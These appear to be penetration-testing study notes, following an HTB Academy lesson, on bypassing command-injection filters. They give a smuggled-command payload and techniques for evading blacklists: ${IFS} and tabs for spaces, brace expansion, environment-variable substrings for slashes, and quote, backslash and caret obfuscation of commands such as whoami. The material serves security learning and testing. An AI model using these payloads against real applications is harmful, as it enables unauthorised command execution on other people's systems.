# Identifying Filters

Let's see we sent the following payload and received an "Invalid Input" message:

```sh
127.0.0.1; whoami
```

Other than the IP, we sent the following 
1. A semi-colon character
2. A space character
3. A `whoami` command

So, the web application either detected a **blacklisted character** or detected a **blacklisted command**

## Blacklisted Characters

A web app may have a list of blacklisted characters, if our command/payload contains them, it would deny the request.

Before we start our attempt at bypassing the filters, we should try to identify which character caused the denied request.

## Identifying Blacklisted Character

We should reduce our request to one character at a time and see when it gets blocked.

# Bypassing Space Filters

## Bypass Blacklisted Operators

We can check for different operators. In the example in HTB Academy, the `\n` new line operator was used for the bypass.

## Bypass Blacklisted Spaces

#### Using Tabs

Using tabs (`%09`) instead of spaces is a technique that may work, as both Linux and Windows accept commands with tabs between arguments.
#### Using $IFS

```sh
${IFS}
```

#### Using Brace Expansion

We can use the **Bash Brace Expansion** feature, which automatically adds spaces between arguments wrapped between braces.

```sh
{ls,-la}
```

# Bypassing Other Blacklisted Characters

Besides injection operators and space characters, a very commonly blacklisted character is the slash (`/`) or backslash (`\`).
## Linux

In the same way we bypassed using spaces via environment variable `${IFS}`, we can use environment variables to replace slashes or any character.

While `${IFS}` directly replaced a space, there's no such environment variable for slashes or semi-columns. However, these characters may be used in an environment variable, and we can specify **start** and **length** of our string to exactly match this character.

```sh
echo ${PATH} 

/usr/local/bin:/usr/bin:/bin:/usr/games
```

```sh
echo ${PATH:0:1}

/
```

```ad-tip
We can use `printenv` command to print all environment variables in Linux.
```

## Windows

The same concept works on Windows as well. We can echo a Windows variable and then specify a starting position, and finally specify a negative end position.

```powershell
echo %HOMEPATH:~6,-11% 

\
```

We can achieve the same thing using the same variables in `Windows PowerShell`.

```powershell
$env:HOMEPATH[0] 

\
```

```ad-tip
We can use `Get-ChildItem Env:` command to print all environment variables.
```

## Character Shifting

```sh
man ascii # \ is on 92, before it is [ on 91

echo $(tr '!-}' '"-~'<<<[)
\
```

# Bypassing Blacklisted Commands

## Linux & Windows

One very common and easy obfuscation technique is inserting certain characters withing the command that are usually ignored by shells like Bash and PowerShell. E.g. single-quote `'` and double-quote `"`, in addition to few others.

**Example:**

```sh
w'h'o'am'i
```

## Linux Only

We can insert few characters in the middle of commands and bash would ignore them and execute the command. These characters include:

- Backslash `\`
- Positional Parameter Character `$@`

The number of characters do not have to be even.

```sh
who$@ami
w\ho\am\i
```

```ad-warning
If the above examples didn't work, this may indicate that we used a filtered character in our payload.
```

## Windows Only

There are also some Windows-only characters that we can insert in the middle of commands, like caret (`^`) character.

```powershell
who^ami
```

